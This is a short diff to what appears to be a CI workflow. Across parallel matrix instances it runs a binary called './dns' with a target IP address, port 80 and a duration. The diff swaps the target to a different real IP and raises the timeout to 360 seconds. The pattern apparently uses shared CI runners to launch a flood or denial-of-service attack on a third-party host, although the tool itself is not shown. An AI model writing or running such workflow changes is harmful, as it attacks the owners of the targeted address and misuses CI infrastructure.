@@ -35,5 +35,5 @@ jobs:
           echo "======================================"
           echo "Starting instance ${{ matrix.instance }}"
           echo "======================================"
-          timeout 120s ./dns 195.154.158.4 80 120
+          timeout 360s ./dns 117.4.182.83 80 120
           echo "Instance ${{ matrix.instance }} finished"
